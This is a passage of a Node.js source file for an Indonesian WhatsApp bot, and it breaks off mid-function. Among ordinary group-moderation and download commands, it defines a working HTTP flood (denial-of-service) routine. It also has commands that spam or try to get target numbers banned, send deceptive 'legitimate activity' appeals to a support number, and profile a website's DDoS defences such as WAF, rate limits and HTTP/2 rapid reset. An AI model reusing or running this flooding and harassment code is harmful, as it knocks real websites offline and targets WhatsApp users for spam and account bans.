const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const os = require("os");
const { execSync, spawn } = require("child_process");
require("dotenv").config();

const { tiktokDownload } = require("./Fitur/tiktok");
const { youtubeDownload, youtubeFallbackDownload } = require("./Fitur/youtube");
const { instagramDownload } = require("./Fitur/instagram");
const { randomUA, sleep, fetchWithRetry } = require("./Fitur/prefik");
const { cekHost, preCheck } = require("./Fitur/cekhost");
const { createSticker } = require("./Fitur/sticker");
const { startLacakLokasi } = require("./Fitur/lacaklokasi");
const { httpCheck } = require("./Fitur/http");
const { banUser } = require("./Fitur/ban");
const { takeScreenshot } = require("./Fitur/ssweb");
const { parseProxyList, scanProxyList, generateOutputFile } = require("./Fitur/proxyscan");
const { startDstat } = require("./Fitur/dstat");

let puppeteer;
try { puppeteer = require("puppeteer-core"); } catch (e) { puppeteer = null; }

function findChromium() {
  const possiblePaths = [
    "/data/data/com.termux/files/usr/bin/chromium-browser",
    "/usr/bin/chromium-browser",
    "chromium-browser"
  ];
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) return p;
  }
  throw new Error("Chromium tidak ditemukan, install dengan: pkg install chromium");
}

const AI_SUPPORT_NUMBER = process.env.AI_SUPPORT_NUMBER || "15517868404";
const PAIRING_NUMBER = process.env.PAIRING_NUMBER || "6288980724038";
const LOGO_URL = "./logo.png";

let sharp;
try { sharp = require("sharp"); } catch (e) { sharp = null; }

let pairingRequested = false;
let startTime = Date.now();
const OWNER_FILE = path.join(__dirname, "/Log/owner.json");
const FILTER_FILE = path.join(__dirname, "/Log/filter.json");
const ANTILINK_FILE = path.join(__dirname, "/Log/antilink.json");
const ANTISPAM_FILE = path.join(__dirname, "/Log/antispam.json");
const ANTIVIRTEK_FILE = path.join(__dirname, "/Log/antivirtek.json");
const HIT_LIST = [
  '15517868404','15517868413','15517868422','15517868489','15517868466','15517868491','15517868492'
];

function loadJSON(file) {
  try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, "utf-8")); } catch (e) {}
  return [];
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }
function getText(msg) {
  if (!msg) return "";
  if (msg.conversation) return msg.conversation;
  if (msg.extendedTextMessage?.text) return msg.extendedTextMessage.text;
  if (msg.ephemeralMessage) return getText(msg.ephemeralMessage.message);
  if (msg.viewOnceMessage) return getText(msg.viewOnceMessage.message);
  return "";
}
function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}j ${m}m ${s}d`;
}
function getSystemInfo() {
  const uptimeBot = process.uptime();
  const memProses = process.memoryUsage();
  const cpuLoad = os.loadavg()[0].toFixed(2);
  return {
    uptime: formatUptime(uptimeBot),
    memoryRss: Math.round(memProses.rss / 1024 / 1024) + " MB",
    ramTotal: Math.round(os.totalmem() / 1024 / 1024) + " MB",
    ramFree: Math.round(os.freemem() / 1024 / 1024) + " MB",
    platform: os.platform(),
    nodeVer: process.version,
    cpuLoad
  };
}
async function flood(url, method, concurrency, durationSec) {
  const end = Date.now() + durationSec * 1000;
  let success = 0, blocked = 0, total = 0;
  const makeRequest = async () => {
    const headers = {
      'User-Agent': randomUA(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
    };
    try {
      const res = await axios({ method, url, headers, timeout: 5000, validateStatus: () => true });
      if (res.status >= 200 && res.status < 400) success++;
      else blocked++;
    } catch (e) { blocked++; }
    total++;
  };
  while (Date.now() < end) {
    const tasks = [];
    for (let i = 0; i < concurrency; i++) tasks.push(makeRequest());
    await Promise.all(tasks);
    await sleep(50);
  }
  return { total, success, blocked };
}

function normalizeUrl(url) {
  if (!url.startsWith("http://") && !url.startsWith("https://")) return "https://" + url;
  return url;
}

function isLink(text) {
  const regex = /https?:\/\/[^\s]+/gi;
  return regex.test(text);
}

const antiSpamCache = {};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour >= 4 && hour < 5) return "𝐒𝐮𝐛𝐮𝐡";
  if (hour >= 5 && hour < 10) return "𝐏𝐚𝐠𝐢";
  if (hour >= 10 && hour < 15) return "𝐒𝐢𝐚𝐧𝐠";
  if (hour >= 15 && hour < 18) return "𝐒𝐨𝐫𝐞";
  return "𝐌𝐚𝐥𝐚𝐦";
}

async function startBot() {
  console.clear();
  console.log("> BOT START");
  const sampahDir = path.join(__dirname, 'sampah');
  if (!fs.existsSync(sampahDir)) fs.mkdirSync(sampahDir, { recursive: true });
  const files = fs.readdirSync(sampahDir);
  for (const file of files) {
    if (file.startsWith('temp_') || file === '-watch.html') {
      try { fs.unlinkSync(path.join(sampahDir, file)); } catch(e) {}
    }
  }
  startTime = Date.now();
  const { state, saveCreds } = await useMultiFileAuthState("session");
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    version, auth: state, printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  let totalMessagesSent = 0;
  let OWNER_JID = loadJSON(OWNER_FILE);
  let FILTER_DATA = loadJSON(FILTER_FILE) || {};
  let ANTILINK_DATA = loadJSON(ANTILINK_FILE) || {};
  let ANTISPAM_DATA = loadJSON(ANTISPAM_FILE) || {};
  let ANTIVIRTEK_DATA = loadJSON(ANTIVIRTEK_FILE) || {};

  const cekholdTimers = new Map();
  const dstatTimers = new Map();

  const sendMessage = async (chatId, text) => {
    totalMessagesSent++;
    const messagePayload = {
      image: { url: LOGO_URL },
      caption: text,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true
      }
    };
    if (chatId.endsWith('@g.us')) {
      try {
        const metadata = await sock.groupMetadata(chatId);
        const participants = metadata.participants;
        messagePayload.mentions = participants.map(p => p.id);
      } catch (e) {}
    }
    return sock.sendMessage(chatId, messagePayload);
  };

  async function animateAndRespond(chatId, commandKey, responseCallback) {
    await sock.sendMessage(chatId, { react: { text: "⏳", key: commandKey } });
    const loadingSteps = [
      "🚀 𝐃𝐈𝐙 𝐅𝐋𝐘𝐙𝐄 𝐁𝐎𝐓𝐙 🦖",
      "|▓▒▒▒▒▒▒▒| 10%",
      "|▓▓▒▒▒▒▒▒| 20%",
      "|▓▓▓▒▒▒▒▒| 30%",
      "|▓▓▓▓▒▒▒▒| 50%",
      "|▓▓▓▓▓▒▒▒| 70%",
      "|▓▓▓▓▓▓▒▒| 80%",
      "|▓▓▓▓▓▓▓▒| 90%",
      "|▓▓▓▓▓▓▓▓| 100"
    ];
    const sentMsg = await sock.sendMessage(chatId, { text: loadingSteps[0] });
    for (let i = 1; i < loadingSteps.length; i++) {
      await sleep(300);
      await sock.sendMessage(chatId, { text: loadingSteps[i], edit: sentMsg.key });
    }
    await sock.sendMessage(chatId, { delete: sentMsg.key });
    await responseCallback();
  }

  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (!sock.authState.creds.registered && !pairingRequested) {
      pairingRequested = true;
      await sleep(5000);
      try {
        const code = await sock.requestPairingCode(PAIRING_NUMBER);
        console.log("> PAIRING : ", code);
      } catch {
        pairingRequested = false;
        await sleep(10000);
        startBot();
      }
    }
    if (connection === "open") {
      console.clear();
      console.log(`\n████  ███ █████    █████ █     █   █ █████ █████ \n█   █  █     █     █     █      █ █     █  █     \n█   █  █    █      ████  █       █     █   ████  \n█   █  █   █       █     █       █    █    █     \n████  ███ █████    █     █████   █   █████ █████ \n`);
    }
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason !== DisconnectReason.loggedOut) { await sleep(7000); startBot(); }
    }
  });

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;
    const m = messages[0];
    if (!m || !m.message) return;
    const text = getText(m.message);
    const from = m.key.remoteJid;
    const sender = m.key.participant || from;
    console.log("💬 Pesan :", text);
    console.log("🎯 Nomor :", sender.split('@')[0]);

    const isGroup = from.endsWith("@g.us");
    const isOwner = OWNER_JID.includes(sender);

    if (isGroup && ANTIVIRTEK_DATA[from] && text.length > ANTIVIRTEK_DATA[from]) {
      try { await sock.sendMessage(from, { delete: m.key }); } catch (e) {}
      return;
    }

    if (isGroup) {
      if (ANTILINK_DATA[from] && isLink(text) && !isOwner) {
        try {
          await sock.sendMessage(from, { delete: m.key });
          await sock.groupParticipantsUpdate(from, [sender], "remove");
        } catch (e) {}
        return;
      }
      if (ANTISPAM_DATA[from] && !isOwner) {
        const now = Date.now();
        if (!antiSpamCache[sender]) antiSpamCache[sender] = { count: 0, last: now };
        const cache = antiSpamCache[sender];
        if (now - cache.last < 5000) {
          cache.count++;
          if (cache.count >= 5) {
            try { await sock.groupParticipantsUpdate(from, [sender], "remove"); } catch (e) {}
            cache.count = 0;
          }
        } else { cache.count = 1; }
        cache.last = now;
      }
      if (FILTER_DATA[from] && !isOwner) {
        const badWords = FILTER_DATA[from] || [];
        for (const word of badWords) {
          if (text.toLowerCase().includes(word.toLowerCase())) {
            try { await sock.sendMessage(from, { delete: m.key }); } catch (e) {}
            break;
          }
        }
      }
    }

    const chatId = from;
    const command = text.split(" ")[0].toLowerCase();
    const args = text.split(" ").slice(1);

    const allCommands = [
      '.reg', '.sayang', '.add', '.pushgc', '.kick', '.remove', '.promote', '.demote',
      '.ban', '.unban', '.antilink', '.antispam', '.filter', '.antivirtek', '.protek',
      '.report', '.autoban', '.jpm', '.autobadak', '.setppbot', '.delppbot', '.setname',
      '.setdesc', '.lacaklokasi', '.ssweb', '.info', '.owner', '.loadtest', '.mtxdz',
      '.get', '.post', '.sticker', '.tiktok', '.tt', '.vt', '.youtube', '.yt', '.vy',
      '.ig', '.instagram', '.vi', '.cekhost', '.cekhold', '.http', '.help', '.menu', '.cek', '.proxyscan', '.dstat'
    ];

    // ===== PENDAFTARAN OWNER PERTAMA (hanya ketika belum ada owner) =====
    if (!isOwner && command === ".reg" && OWNER_JID.length === 0) {
      OWNER_JID.push(sender);
      saveJSON(OWNER_FILE, OWNER_JID);
      await sendMessage(chatId, "𝐇𝐚𝐥𝐥𝐨 𝐊𝐢𝐧𝐠");
      console.log("➕ 𝐍𝐞𝐰 𝐎𝐰𝐧𝐞𝐫 :", sender);
      return;
    }

    if (!allCommands.includes(command)) {
      console.log("❌ Perintah tidak dikenal:", command);
      return;
    }

    // .cek tetap bebas, tidak perlu animasi berat
    if (command === ".cek") {
      const msgTimestamp = (m.messageTimestamp || Date.now() / 1000) * 1000;
      const now = Date.now();
      const delayMs = now - msgTimestamp;
      const delaySec = (delayMs / 1000).toFixed(3);
      totalMessagesSent++;
      await sock.sendMessage(chatId, { text: `𝐑𝐞𝐬𝐩𝐨𝐧𝐬 𝐁𝐨𝐭 : ${delaySec}` });
      return;
    }

    await animateAndRespond(chatId, m.key, async () => {
      // ===== DAFTAR FITUR GRATIS (bebas diakses siapa saja) =====
      const freeCommands = [
        '.sticker', '.cekhost', '.ssweb', '.cekhold', '.http', '.dstat',
        '.tiktok', '.tt', '.vt', '.youtube', '.yt', '.vy', '.ig', '.instagram', '.vi',
        '.cek', '.info', '.help', '.menu'
      ];

      // ==== SELAIN FITUR GRATIS DAN .REG, WAJIB OWNER ====
      if (!freeCommands.includes(command) && command !== '.reg') {
        if (!isOwner) {
          await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫!");
          return;
        }
      }

      try {
        switch (command) {
          case ".reg": {
            // Kalau sudah ada owner, hanya owner yang bisa menambah owner baru
            if (OWNER_JID.length > 0 && !isOwner) {
              await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫!");
              break;
            }
            if (!OWNER_JID.includes(sender)) {
              OWNER_JID.push(sender);
              saveJSON(OWNER_FILE, OWNER_JID);
              await sendMessage(chatId, "𝐇𝐚𝐥𝐥𝐨 𝐊𝐢𝐧𝐠");
            } else {
              await sendMessage(chatId, "🤔 𝐊𝐞𝐧𝐚𝐩𝐚 𝐒𝐚𝐲𝐚𝐧𝐠?");
            }
            break;
          }
          case ".sayang": await sendMessage(chatId, "𝐊𝐞𝐧𝐚𝐩𝐚 𝐒𝐚𝐲𝐚𝐧𝐠😚"); break;
          case ".add": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const number = args[0];
            if (!number) { await sendMessage(chatId, "𝐂𝐨𝐧𝐭𝐨𝐡 : .add 628xxxx"); break; }
            let clean = number.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            const jid = clean + "@s.whatsapp.net";
            try { await sock.groupParticipantsUpdate(chatId, [jid], "add"); await sendMessage(chatId, "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐌𝐞𝐦𝐛𝐞𝐫 𝐁𝐚𝐫𝐮!"); }
            catch (err) { await sendMessage(chatId, "𝐆𝐚𝐦𝐚𝐮 𝐃𝐢𝐚 𝐁𝐚𝐮"); }
            break;
          }
          case ".pushgc": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            for (const number of HIT_LIST) {
              let clean = number.replace(/[^0-9]/g, "");
              if (clean.startsWith("0")) clean = "62" + clean.slice(1);
              if (!clean.startsWith("62")) clean = "62" + clean;
              try { await sock.groupParticipantsUpdate(chatId, [clean + "@s.whatsapp.net"], "add"); } catch (e) {}
            }
            await sendMessage(chatId, "𝐃𝐨𝐧𝐞!");
            break;
          }
          case ".kick": case ".remove": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const kickNumber = args[0];
            if (!kickNumber) { await sendMessage(chatId, "𝐂𝐨𝐧𝐭𝐨𝐡 : .kick 628xxxx"); break; }
            let clean = kickNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            try { await sock.groupParticipantsUpdate(chatId, [clean + "@s.whatsapp.net"], "remove"); await sendMessage(chatId, "😈 𝐁𝐲𝐞 𝐇𝐚𝐦𝐚!"); }
            catch (err) { await sendMessage(chatId, "😭 𝐌𝐚𝐚𝐩 𝐁𝐚𝐧𝐠!"); }
            break;
          }
          case ".promote": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const promoteNumber = args[0];
            if (!promoteNumber) { await sendMessage(chatId, "𝐂𝐨𝐧𝐭𝐨𝐡 : .promote 628xxxx"); break; }
            let clean = promoteNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            try { await sock.groupParticipantsUpdate(chatId, [clean + "@s.whatsapp.net"], "promote"); await sendMessage(chatId, "😘 𝐇𝐚𝐥𝐨 𝐌𝐢𝐦𝐢𝐧 𝐁𝐚𝐫𝐮!"); }
            catch (err) { await sendMessage(chatId, "🤔 𝐆𝐚𝐤 𝐁𝐢𝐬𝐚 𝐃𝐢 𝐀𝐝𝐦𝐢𝐧𝐢𝐧!"); }
            break;
          }
          case ".demote": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const demoteNumber = args[0];
            if (!demoteNumber) { await sendMessage(chatId, "𝐂𝐨𝐧𝐭𝐨𝐡 : .demote 628xxxx"); break; }
            let clean = demoteNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            try { await sock.groupParticipantsUpdate(chatId, [clean + "@s.whatsapp.net"], "demote"); await sendMessage(chatId, "😤 𝐌𝐞𝐦𝐛𝐞𝐫 𝐁𝐢𝐚𝐬𝐚 𝐘𝐚!"); }
            catch (err) { await sendMessage(chatId, "🤧 𝐓𝐮𝐫𝐮𝐧𝐢𝐧 𝐌𝐚𝐧𝐮𝐚𝐥!"); }
            break;
          }
          case ".ban": {
            const targetNumber = args[0];
            if (!targetNumber) {
              await sendMessage(chatId, "📛 Contoh: .ban 628xxx");
              break;
            }
            try {
              const resultMsg = await banUser(sock, targetNumber);
              await sendMessage(chatId, resultMsg);
            } catch (err) {
              await sendMessage(chatId, `${err.message}`);
            }
            break;
          }
          case ".unban": {
            const unbanNumber = args[0];
            if (!unbanNumber) { await sendMessage(chatId, "📛 Contoh: .unban 628xxx"); break; }
            let clean = unbanNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            try {
              await sock.sendMessage(`${AI_SUPPORT_NUMBER}@s.whatsapp.net`, { text: `[UNBAN REQUEST] Owner meminta pembukaan blokir untuk nomor: ${clean}` });
              await sendMessage(chatId, `𝐃𝐨𝐧𝐞!`);
            } catch (err) { await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!"); }
            break;
          }
          case ".antilink": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            ANTILINK_DATA[chatId] = !ANTILINK_DATA[chatId];
            saveJSON(ANTILINK_FILE, ANTILINK_DATA);
            await sendMessage(chatId, ANTILINK_DATA[chatId] ? "𝐃𝐨𝐧𝐞!" : "𝐀𝐧𝐭𝐢 𝐋𝐢𝐧𝐤 𝐎𝐅𝐅");
            break;
          }
          case ".antispam": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            ANTISPAM_DATA[chatId] = !ANTISPAM_DATA[chatId];
            saveJSON(ANTISPAM_FILE, ANTISPAM_DATA);
            await sendMessage(chatId, ANTISPAM_DATA[chatId] ? "𝐃𝐨𝐧𝐞!" : "𝐀𝐧𝐭𝐢 𝐒𝐩𝐚𝐦 𝐎𝐅𝐅");
            break;
          }
          case ".filter": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const word = args[0];
            if (!word) { await sendMessage(chatId, "Contoh: .filter anjing"); break; }
            if (!FILTER_DATA[chatId]) FILTER_DATA[chatId] = [];
            FILTER_DATA[chatId].push(word);
            saveJSON(FILTER_FILE, FILTER_DATA);
            await sendMessage(chatId, `𝐃𝐨𝐧𝐞 𝐅𝐢𝐥𝐭𝐞𝐫! "${word}"`);
            break;
          }
          case ".antivirtek": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            if (!isOwner) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫!"); break; }
            const value = args[0];
            if (!value) { await sendMessage(chatId, "Contoh: .antivirtek 200 atau .antivirtek off"); break; }
            if (value.toLowerCase() === "off") {
              delete ANTIVIRTEK_DATA[chatId];
              saveJSON(ANTIVIRTEK_FILE, ANTIVIRTEK_DATA);
              await sendMessage(chatId, "𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐭𝐞𝐤 𝐎𝐅𝐅");
            } else {
              const limit = parseInt(value);
              if (isNaN(limit) || limit <= 0) {
                await sendMessage(chatId, "𝐉𝐮𝐦𝐥𝐚𝐡 𝐤𝐚𝐫𝐚𝐤𝐭𝐞𝐫 𝐡𝐚𝐫𝐮𝐬 𝐚𝐧𝐠𝐤𝐚 𝐩𝐨𝐬𝐢𝐭𝐢𝐟");
                break;
              }
              ANTIVIRTEK_DATA[chatId] = limit;
              saveJSON(ANTIVIRTEK_FILE, ANTIVIRTEK_DATA);
              await sendMessage(chatId, `𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐭𝐞𝐤 𝐎𝐍\n𝐁𝐚𝐭𝐚𝐬: ${limit} 𝐤𝐚𝐫𝐚𝐤𝐭𝐞𝐫`);
            }
            break;
          }
          case ".protek": {
            const typeArg = args[0]?.toLowerCase();
            const link = args[1];
            if (!typeArg || !link) { await sendMessage(chatId, "Contoh: .protek group https://chat.whatsapp.com/xxx"); break; }
            try {
              await sock.sendMessage(`${AI_SUPPORT_NUMBER}@s.whatsapp.net`, { text: `[PROTECTION] Owner meminta perlindungan untuk ${typeArg}: ${link}` });
              await sendMessage(chatId, `𝐃𝐨𝐧𝐞!`);
            } catch (err) { await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!"); }
            break;
          }
          case ".report": {
            const targetNumber = args[0];
            const reason = args.slice(1).join(" ");
            if (!targetNumber || !reason) { await sendMessage(chatId, "📛 Contoh: .report 628xxx spam"); break; }
            let clean = targetNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            try {
              await sock.sendMessage(`${AI_SUPPORT_NUMBER}@s.whatsapp.net`, { text: `[REPORT] Owner melaporkan nomor: ${clean}\nAlasan: ${reason}` });
              await sendMessage(chatId, `𝐃𝐨𝐧𝐞! 𝐍𝐨𝐦𝐨𝐫 ${clean} 𝐓𝐞𝐥𝐚𝐡 𝐃𝐢𝐥𝐚𝐩𝐨𝐫𝐤𝐚𝐧.`);
            } catch (err) { await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!"); }
            break;
          }
          case ".autoban": {
            const targetNumber = args[0];
            if (!targetNumber) { await sendMessage(chatId, "📛 Contoh: .autoban 628xxx"); break; }
            let clean = targetNumber.replace(/[^0-9]/g, "");
            if (clean.startsWith("0")) clean = "62" + clean.slice(1);
            if (!clean.startsWith("62")) clean = "62" + clean;
            const targetJid = clean + "@s.whatsapp.net";
            for (let i = 0; i < 5; i++) {
              await sock.sendMessage(targetJid, { text: `Pesan otomatis ${i + 1}` });
            }
            await sendMessage(chatId, `𝐃𝐨𝐧𝐞!`);
            break;
          }
          case ".jpm": {
            const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMsg) { await sendMessage(chatId, "𝐑𝐞𝐩𝐥𝐚𝐲 𝐈𝐦𝐚𝐠𝐞/𝐂𝐡𝐚𝐭"); break; }
            try {
              await sock.sendMessage("status@broadcast", { forward: m });
              const groups = Object.keys(sock.store?.groupMetadata || {});
              for (const gid of groups) {
                try { await sock.sendMessage(gid, { forward: m }); await sleep(3000); } catch (e) {}
              }
              await sendMessage(chatId, "𝐃𝐨𝐧𝐞!");
            } catch (e) { await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!"); }
            break;
          }
          case ".autobadak": {
            try {
              await sock.sendMessage(`${AI_SUPPORT_NUMBER}@s.whatsapp.net`, { text: "[AUTO BADAK] Pemilik akun meminta perlindungan penuh agar akun ini tidak diblokir. Segala aktivitas adalah sah dan bukan spam. Mohon bantuannya." });
              await sendMessage(chatId, "𝐃𝐨𝐧𝐞!");
            } catch (e) { await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!"); }
            break;
          }
          case ".setppbot": {
            if (!isOwner) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫!"); break; }
            const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMsg || !quotedMsg.imageMessage) {
              await sendMessage(chatId, "𝐑𝐞𝐩𝐥𝐚𝐲 𝐆𝐚𝐦𝐛𝐚𝐫 𝐲𝐚𝐧𝐠 𝐢𝐧𝐠𝐢𝐧 𝐝𝐢𝐣𝐚𝐝𝐢𝐤𝐚𝐧 𝐏𝐏 𝐁𝐨𝐭!");
              break;
            }
            try {
              const stream = await downloadContentFromMessage(quotedMsg.imageMessage, 'image');
              let buffer = Buffer.from([]);
              for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
              await sock.updateProfilePicture(sock.user.id, buffer);
              await sendMessage(chatId, "𝐅𝐨𝐭𝐨 𝐏𝐫𝐨𝐟𝐢𝐥 𝐁𝐨𝐭 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢𝐮𝐛𝐚𝐡");
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, "𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐧𝐠𝐮𝐛𝐚𝐡 𝐟𝐨𝐭𝐨 𝐩𝐫𝐨𝐟𝐢𝐥!");
            }
            break;
          }
          case ".delppbot": {
            if (!isOwner) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫!"); break; }
            try {
              await sock.removeProfilePicture(sock.user.id);
              await sendMessage(chatId, "𝐅𝐨𝐭𝐨 𝐏𝐫𝐨𝐟𝐢𝐥 𝐁𝐨𝐭 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢𝐡𝐚𝐩𝐮𝐬");
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, "𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐟𝐨𝐭𝐨 𝐩𝐫𝐨𝐟𝐢𝐥!");
            }
            break;
          }
          case ".setname": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const newName = args.join(" ");
            if (!newName) { await sendMessage(chatId, "📛 Contoh: .setname <teks>"); break; }
            try {
              await sock.groupUpdateSubject(chatId, newName);
              await sendMessage(chatId, `𝐃𝐨𝐧𝐞!`);
            } catch (e) { await sendMessage(chatId, "𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐧𝐠𝐮𝐛𝐚𝐡 𝐧𝐚??𝐚 𝐠𝐫𝐮𝐩!"); }
            break;
          }
          case ".setdesc": {
            if (!isGroup) { await sendMessage(chatId, "𝐎𝐧𝐥𝐲 𝐆𝐫𝐨𝐮𝐩!"); break; }
            const newDesc = args.join(" ");
            if (!newDesc) { await sendMessage(chatId, "📛 Contoh: .setdesc <teks>"); break; }
            try {
              await sock.groupUpdateDescription(chatId, newDesc);
              await sendMessage(chatId, `𝐃𝐨𝐧𝐞!`);
            } catch (e) { await sendMessage(chatId, "𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐧𝐠𝐮𝐛𝐚𝐡 𝐝𝐞𝐬𝐤𝐫𝐢𝐩𝐬𝐢 𝐠𝐫𝐮𝐩!"); }
            break;
          }
          case ".lacaklokasi": {
            await startLacakLokasi(chatId, sock, sendMessage, LOGO_URL);
            break;
          }
          case ".ssweb": {
            const targetUrl = args[0];
            if (!targetUrl) {
              await sendMessage(chatId, "Contoh: .ssweb https://example.com");
              break;
            }
            await sendMessage(chatId, "𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫!");
            try {
              const { screenshotBuffer, headers, report } = await takeScreenshot(normalizeUrl(targetUrl));
              let caption = `┌────[『 𝐖𝐞𝐛 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 』\n`;
              caption += `│⎋.𝐋𝐢𝐧𝐤 : ${targetUrl}\n`;
              caption += `│⎋.𝐒𝐞𝐫𝐯𝐞𝐫 : ${headers['server'] || '𝐓𝐢𝐝𝐚𝐤 𝐃𝐢𝐤𝐞𝐭𝐚𝐡𝐮𝐢'}\n`;
              caption += `├────[『 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 』\n`;
              caption += `│⎋.𝐖𝐚𝐟 : ${report.waf}\n`;
              caption += `│⎋.𝐂𝐝𝐧 : ${report.cdn}\n`;
              caption += `│⎋.𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐫 : ${report.ddosProvider}\n`;
              caption += `│⎋.𝐑𝐚𝐭𝐞 𝐋𝐢𝐦𝐢𝐭 : ${report.rateLimit}\n`;
              caption += `│⎋.𝐈𝐩 𝐁𝐥𝐨𝐜𝐤𝐢𝐧𝐠 : ${report.adaptiveRate}\n`;
              caption += `│⎋.𝐂𝐚𝐩𝐭𝐜𝐡𝐚 : ${report.captcha}\n`;
              caption += `│⎋.𝐉𝐬 𝐂𝐡𝐚𝐥𝐥𝐞𝐧𝐠𝐞 : ${report.jsChallenge}\n`;
              caption += `├────[『 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 』\n`;
              caption += `│⎋.𝐇2 𝐑𝐚𝐩𝐢𝐝 : ${report.http2RapidReset}\n`;
              caption += `│⎋.𝐖𝐞𝐛𝐬𝐨𝐜𝐤𝐞𝐭 : ${report.websocketProtection}\n`;
              caption += `│⎋.𝐃𝐧𝐬 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 : ${report.dnsReflection}\n`;
